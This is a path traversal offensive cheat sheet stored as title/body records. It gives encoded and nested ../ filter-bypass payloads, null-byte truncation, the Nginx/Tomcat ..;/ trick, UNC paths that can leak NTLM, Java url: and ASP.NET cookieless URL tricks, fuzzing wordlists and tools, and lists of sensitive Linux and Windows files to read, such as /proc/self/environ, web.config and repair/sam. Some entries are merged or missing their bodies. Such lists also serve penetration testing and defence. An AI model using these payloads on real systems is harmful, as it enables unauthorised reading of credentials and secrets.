entries.title: What it is and where to look
entries.body:
Path / Directory Traversal is a vulnerability where an application substitutes controllable input into a file path. Using ../ (dot-dot-slash) sequences you can break out of the working directory and read arbitrary files on the filesystem.

Where to look:
- Parameters holding a file name: ?file=, ?page=, ?path=, ?template=, ?lang=, ?download=, ?img=.
- File upload/download, previews, exports, report generation.
- Headers and cookies that get mapped to a path.

Difference from File Inclusion: here the goal is to READ a file by path (../../etc/passwd). LFI/RFI additionally EXECUTES the content (php://, data://, include()).

entries.title: Basic constructs and filter bypasses
entries.body:
With .. we move up into the parent directory. Below are encoding variants for bypassing weak filters:

../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

entries.title: Tools
entries.body:
dotdotpwn (wireghoul/dotdotpwn) - a directory traversal fuzzer.
IIS Short Name Scanner (irsdl/iis_shortname_scanner), shortscan (bitquark) - brute force short 8.3 names in IIS.
windowsblindread (soffensive) - a list of interesting paths on Windows.

entries.title: Windows - bypass via ../ to win.ini / drivers/etc/hosts
What overlong UTF-8 is
entries.body: By the standard, each codepoint is encoded with the minimum necessary number of bytes. An encoding with extra bytes (overlong) is formally invalid, but some parsers accept it and normalize it into a regular character - and that is what bypasses a filter on ../

entries.title: Mangled path - duplication when ../ is removed
entries.body:
If a WAF/filter strips ../ ONCE (non-recursively) - nest the sequences so that after stripping you get ../ again.

..././
...\.\
....//
..../\

entries.title: NULL-byte (%00) - truncating the extension
entries.body: The null byte (%00, 0x00) is a string terminator in C/C++. If the application appends an extension (for example .htm), %00 truncates the string before it and lets you read an arbitrary file.

entries.title: NULL-byte - example with a suffix (Kyocera d-COPIA253MF, CVE-2020-23575)
..;/ - discrepancy between Nginx and Tomcat
entries.body:
Nginx treats /..;/ as a regular directory, while Tomcat interprets it as /../ - this lets you reach hidden servlets behind the proxy.

..;/

entries.title: UNC Share (Windows) - \\host\share
entries.body:
Injecting a Windows UNC path (\\UNC\share\name) redirects access to an arbitrary file or network resource. Additionally, the machine may authenticate to the remote share, sending an NTLM exchange (which can be captured/relayed).

\\localhost\c$\windows\win.ini

entries.title: Java new URL('') - the url: prefix
entries.body:
In Java, new URL('') supports the format url:URL - you can slip in file:// or http:// to an internal resource.

url:file:///etc/passwd
url:http://127.0.0.1:8080

entries.title: ASP.NET cookieless - inserting (S(...)) into the URL
entries.body:
With cookieless session state enabled, ASP.NET embeds the Session ID right into the URL: http://site/(S(lit3py55t21z5v55vlm25s55))/page.aspx. This insertion can be used to bypass URL filtering.

Application at the root:
/(S(X))/
/(Y(Z))/
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/
/(S(X))/admin/(S(X))/main.aspx
/(S(x))/b/(S(x))in/Navigator.dll

Application in a subfolder:
/MyApp/(S(X))/
/admin/(S(X))/main.aspx
/admin/Foobar/(S(X))/../(S(X))/main.aspx

entries.title: IIS Short Name - brute force 8.3 names
Ready-made wordlists for depth fuzzing
entries.body:
Traversal depth is brute-forced with a fuzzer against a wordlist (1-8+ levels of ../) with different encodings at the same time. PayloadsAllTheThings ships ready-made lists (Intruder/):

- directory_traversal.txt - Windows win.ini / etc/passwd / .htaccess in plain, %5c/%2e-encoded and double-percent (%%35%63...) forms.
- deep_traversal.txt - templates for 1-8 levels with the {FILE} placeholder: ../, ..;/, ..%2f, %2e%2e/ ...
- traversals-8-deep-exotic-encoding.txt - the same, with a leading /../, plus double-encode %252f.
- dotdotpwn.txt - combinations of ../ + typical files (etc/passwd, etc/issue, boot.ini, drivers/etc/hosts).

Substitute {FILE} = etc/passwd or windows/win.ini and run it through Intruder/ffuf.

entries.title: /proc - processes, environment, version
entries.body:
/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the file descriptor
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts

entries.title: Reliable PoC files (win.ini / license.rtf)
entries.body:
The files license.rtf and win.ini are consistently present on modern Windows - handy as proof-of-concept (the content is not secret, but the fact of reading it confirms the vulnerability).

C:\Windows\win.ini
C:\windows\system32\license.rtf

entries.title: Sensitive paths (windowsblindread)
entries.body:
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/system volume information/wpsettings.dat
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
